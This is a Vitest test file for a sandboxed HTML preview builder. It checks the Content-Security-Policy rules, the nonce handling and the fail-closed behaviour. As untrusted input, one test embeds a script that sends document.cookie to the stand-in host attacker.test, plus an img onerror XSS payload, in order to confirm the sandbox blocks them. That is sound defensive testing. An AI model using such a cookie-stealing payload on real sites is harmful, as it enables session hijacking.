import { describe, expect, it } from "vitest";
import { buildSandboxedPreviewDocument } from "./HtmlPreviewFrame";

describe("sandboxed HTML preview", () => {
  it("allows only the nonce-bound inspector script in interactive previews", () => {
    const nonce = "0123456789abcdef0123456789abcdef";
    const untrusted = `<script>fetch('https://attacker.test/?x='+document.cookie)</script><img src=x onerror="alert(1)"><p>preview</p>`;
    const document = buildSandboxedPreviewDocument(untrusted, true, nonce);

    expect(document).toContain(`script-src 'nonce-${nonce}'`);
    expect(document).toContain("connect-src 'none'");
    expect(document).toContain("img-src data: blob:");
    expect(document).toContain(`<script nonce="${nonce}">`);
    expect(document).toContain("<script>fetch('https://attacker.test/?x='+document.cookie)</script>");
    expect(document.match(/<script\b/g)).toHaveLength(2);
    expect(document.indexOf("Content-Security-Policy")).toBeLessThan(document.indexOf(untrusted));
  });

  it("blocks all scripts and external resources in non-interactive previews", () => {
    const document = buildSandboxedPreviewDocument("<script>alert(1)</script><p>safe text</p>");

    expect(document).toContain("script-src 'none'");
    expect(document).toContain("default-src 'none'");
    expect(document).toContain("connect-src 'none'");
    expect(document).not.toContain("(function () {");
  });

  it("fails closed when an interactive preview has no valid nonce", () => {
    const document = buildSandboxedPreviewDocument("<p>preview</p>", true, "bad nonce");

    expect(document).toContain("script-src 'none'");
    expect(document).not.toContain("<script nonce=");
  });
});
